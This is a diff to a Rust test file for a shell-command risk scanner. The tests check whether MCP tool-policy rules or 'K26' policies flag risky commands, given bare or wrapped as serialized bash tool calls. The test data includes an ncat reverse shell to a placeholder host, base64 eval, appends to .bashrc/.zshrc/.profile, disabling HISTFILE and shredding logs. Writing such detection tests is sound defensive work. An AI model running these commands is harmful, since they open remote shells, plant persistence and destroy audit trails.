@@ -61,6 +61,13 @@ const HANDED_OFF: &[(&str, &[(&str, &str)])] = &[
             ("ncat -e /bin/sh example.test 4242", "CMD-REVSHELL-NC"),
         ],
     ),
+];
+
+/// Tool arguments K26 decides only as a bare command. `shell_command` scans
+/// an MCP tool call as the whole serialized document and does not extract its
+/// arguments, so the K26 policy misses them there; the MCP policy rule keeps
+/// them until K26 receives the extracted command.
+const K26_BARE_ONLY: &[(&str, &[(&str, &str)])] = &[
     (
         "pi_mcp_encoded_cmd",
         &[
@@ -153,6 +160,9 @@ const K26_FOLLOW_UPS: &[(&str, &str)] = &[
     ),
     ("pi_mcp_encoded_cmd", "eval base64"),
     ("pi_mcp_shell_profile_cmd", "alias ls=true"),
+    ("pi_mcp_shell_profile_cmd", "echo test >> .bashrc"),
+    ("pi_mcp_shell_profile_cmd", "echo x >>.zshrc"),
+    ("pi_mcp_shell_profile_cmd", "echo x >> .profile"),
     ("pi_mcp_log_tamper", "export HISTFILE=/dev/null"),
     ("pi_mcp_log_tamper", "shred -u app.log"),
 ];
@@ -167,6 +177,11 @@ fn pipeline() -> ShellRiskPipeline {
     let pipeline = ShellRiskPipeline::from_bundle_dir(&dir).unwrap();
     std::fs::remove_dir_all(dir).ok();
     pipeline
+}
+
+/// The MCP tool call as `shell_command` receives it: one serialized document.
+fn tool_call(command: &str) -> String {
+    serde_json::json!({"tool": "bash", "arguments": command}).to_string()
 }
 
 fn policies(pipeline: &ShellRiskPipeline, command: &str) -> Vec<String> {
@@ -204,6 +219,15 @@ fn fired(command: &str) -> BTreeSet<String> {
     ids
 }
 
+/// MCP policy rule ids that fire on the serialized `bash` tool call.
+fn fired_in_tool_call(command: &str) -> BTreeSet<String> {
+    McpToolPolicyScanner::new()
+        .scan_text(&tool_call(command))
+        .into_iter()
+        .map(|violation| violation.rule_name.to_string())
+        .collect()
+}
+
 #[test]
 fn handed_off_commands_are_decided_by_a_k26_policy_and_left_by_the_rule() {
     let pipeline = pipeline();
@@ -217,6 +241,36 @@ fn handed_off_commands_are_decided_by_a_k26_policy_and_left_by_the_rule() {
             assert!(
                 !fired(command).contains(*rule),
                 "{rule} still duplicates K26 on {command:?}"
+            );
+            if rule.starts_with("pi_mcp_") {
+                let ids = policies(&pipeline, &tool_call(command));
+                assert!(
+                    ids.iter().any(|id| id == policy),
+                    "{rule}: K26 policy {policy} misses the tool call of {command:?}: {ids:?}"
+                );
+            }
+        }
+    }
+}
+
+#[test]
+fn bare_only_commands_stay_with_the_mcp_rule_in_the_tool_call() {
+    let pipeline = pipeline();
+    for (rule, commands) in K26_BARE_ONLY {
+        for (command, policy) in *commands {
+            let ids = policies(&pipeline, command);
+            assert!(
+                ids.iter().any(|id| id == policy),
+                "{rule}: K26 policy {policy} does not decide {command:?}: {ids:?}"
+            );
+            let ids = policies(&pipeline, &tool_call(command));
+            assert!(
+                ids.is_empty(),
+                "K26 now decides the tool call of {command:?} by {ids:?}; hand {rule} off"
+            );
+            assert!(
+                fired(command).contains(*rule) && fired_in_tool_call(command).contains(*rule),
+                "{rule} lost {command:?} before K26 decides its tool call"
             );
         }
     }
@@ -235,6 +289,12 @@ fn k26_follow_ups_stay_with_their_rule() {
             fired(command).contains(*rule),
             "{rule} lost {command:?} before K26 covers it"
         );
+        if rule.starts_with("pi_mcp_") {
+            assert!(
+                fired_in_tool_call(command).contains(*rule),
+                "{rule} lost the tool call of {command:?} before K26 covers it"
+            );
+        }
     }
 }
 
